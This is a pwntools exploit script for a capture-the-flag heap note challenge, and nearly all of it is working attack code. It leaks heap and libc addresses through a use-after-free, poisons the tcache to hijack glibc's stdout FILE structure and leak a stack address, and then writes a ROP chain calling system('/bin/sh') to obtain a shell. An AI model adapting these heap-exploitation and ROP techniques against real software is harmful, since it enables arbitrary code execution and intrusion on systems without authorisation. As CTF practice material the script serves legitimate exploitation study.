#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("heap_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30010

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

menu_choice = b"Enter choice > "

def CREATE(idx: int, size: int, content: bytes = b'a'):
    sla(menu_choice, b"1")
    sla(b"Note Index > ", str(idx).encode())
    sla(b"Note Size > ", str(size).encode())
    sla(b"Note Content > ", content)
    
def DELETE(idx: int):
    sla(menu_choice, b"2")
    sla(b"Note Index > ", str(idx).encode())
    
def VIEW(idx: int):
    sla(menu_choice, b"3")
    sla(b"Note Index > ", str(idx).encode())

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

# main: 0x555555555558
# call menu: 0x555555555578

gdbscript = '''
start
breakrva 0x1578
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

for i in range(10):
    CREATE(i, 0x98)
    
for i in range(7):
    DELETE(i)

# 1. leak heap base

VIEW(0)
leaked_heap = io.recv(5)
heap_base = u64(leaked_heap.ljust(8, b'\x00')) << 12
success(f"done 1. heap base: {hex(heap_base)}")

# 2. House of cupcake + leak libc

# prev: 7
# a: 8
    
DELETE(8) # delete a
## leak libc
VIEW(8)
leaked_libc = io.recv(6)
leaked_libc = u64(leaked_libc.ljust(8, b'\x00'))
libc.address = leaked_libc - 0x219ce0
success(f"done 2.1. libc.address: {hex(libc.address)}")
## done

DELETE(7) # delete prev
CREATE(7, 0x98) # request 1 tcache
DELETE(8) # push a to tcache

poison_next = ((heap_base+0x7a0)>>12) ^ libc.sym['_IO_2_1_stdout_']

tcache_poisoning_payload = flat(
    b"a"*0x90,
    b"a"*0x8,           # a->prev_size
    p64(0xa1),          # a->size
    p64(poison_next),   # a->next
)
CREATE(15, 0x138, tcache_poisoning_payload)
success("done 2. House of cupcake: Tcache Poisoning")
# 0xa0 [  7]: 0x55555555b7a0 —▸ 0x7ffff7e1a780 (_IO_2_1_stdout_) ◂— 0x70452569d

# 3. FSOP to leak environ
CREATE(0, 0x98) # 0x55555555b7a0

fs = FileStructure()
fs.flags = 0xfbad1800
fs._IO_write_base = libc.sym['environ']
fs._IO_write_ptr = libc.sym['environ']+8
FSOP_payload = bytes(fs)[:0x8*6]
CREATE(0, 0x98, FSOP_payload) # _IO_2_1_stdout_

leaked_environ = u64(io.recvuntil(b"1. Create note")[-23:-15])
success(f"done 3. environ: {hex(leaked_environ)}")

debug_ret_CREATE = 0x7fffffffe028
debug_leaked_environ = 0x7fffffffe168
real_ret_CREATE = leaked_environ - (debug_leaked_environ - debug_ret_CREATE)

info(f"leaked_environ: {hex(leaked_environ)}")
success(f"real_ret_CREATE: {hex(real_ret_CREATE)}")

# 4. House of cupcake a gain to Tcache poisoning with stack addr

DELETE(8)
DELETE(15)

poison_next = ((heap_base+0x7a0)>>12) ^ (real_ret_CREATE-0x8)

tcache_poisoning_payload = flat(
    b"a"*0x90,
    b"a"*0x8,           # a->prev_size
    p64(0xa1),          # a->size
    p64(poison_next),   # a->next
)

CREATE(15, 0x138, tcache_poisoning_payload)
success(f"done 4. house of cupcake")

# ROP gadget

CREATE(0, 0x98, b"a"*0x10)

# 0x000000000002a3e5 : pop rdi ; ret
poprdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6
binsh_addr = next(libc.search(b'/bin/sh\x00'))

ROPgadget = flat(
    p64(poprdi),
    p64(binsh_addr),
    p64(ret),
    p64(libc.sym['system'])    
)

CREATE(0, 0x98, b"a"*0x8 + ROPgadget)

io.interactive()

# https://ctftime.org/writeup/34812